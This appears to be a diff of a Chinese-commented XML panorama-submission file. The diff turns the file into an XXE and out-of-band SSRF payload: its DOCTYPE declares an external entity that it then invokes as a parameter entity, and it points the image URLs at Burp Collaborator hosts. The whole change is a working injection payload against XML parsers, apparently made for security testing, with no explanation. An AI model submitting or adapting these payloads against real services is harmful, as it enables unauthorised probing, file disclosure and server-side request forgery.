@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://8mvwjfb6jcpo18jjxthcdtpzzq5it7.burpcollaborator.net" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/" > %xxe;]>
 <bdpano>
     <task name="春季风景全景图" from_url_host="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net"  > <!--name 必填。需与XR平台所提交的任务名称保持一致。from_url_host 必填。为企业官网主页-->
 
@@ -10,7 +10,7 @@
             location 必填。为该外景地点对应的省市区具体地址。
             tag 选填。为针对本套图的补充标签或说明。
             lon、lat  选填。为该外景所在的经度及纬度。有则更佳，便于匹配具体位置-->
-		<foo>&xxe;</foo>
+		
                 <author name="作者：创世汇鑫"/>
                 <!--name 必填。作者信息，需保证真实，不允许出现手机号、网址、微信QQ等敏感信息-->
 
@@ -25,7 +25,7 @@
                     weather 必填。选项：晴、多云、阴、雨、雪、雾、霜、沙尘暴、霾。根据实际情况进行选择
 					from_url 选填。表示资源来源网站的地址。可能在全景页或其他情况下进行跳转 -->
 					
-                    <thumb url="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/thumb.jpg"/>
+                    <thumb url="http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/pano/scene_1622769/pano.tiles/thumb.jpg"/>
 					
 					<!--选填：thumb 用来标记缩略图信息-->
 
@@ -38,7 +38,7 @@
                      cube 必填。用来标记全景六方图信息，最少出现0次，最多出现一次，url为六方图地址，前缀为mobile，方图用l,f,r,b,u,d表示左前右后上下” -->
 					
                     <cube_group>
-                        <front url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_f.jpg"/>
+                        <front url = "http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_f.jpg"/>
                         <back url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_b.jpg"/>
                         <up url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_u.jpg"/>
                         <down url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_d.jpg"/>
@@ -47,7 +47,7 @@
                     </cube_group>
                     <!-- 方法二 front,back,up,down,left,right 分别代表前、后、上、下、左、右-->
 
-                    <sphere url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_l.jpg"/>
+                    <sphere url = "http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_l.jpg"/>
                     <!--方法三 sphere 为单张2:1全景图 -->
 
                     <hotspot name="hotspot_0" ath="32.6640766319" atv="35.9793462799" url="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/feiting.png" txt="潜水艇" linkedscene="scene_1622768"/>
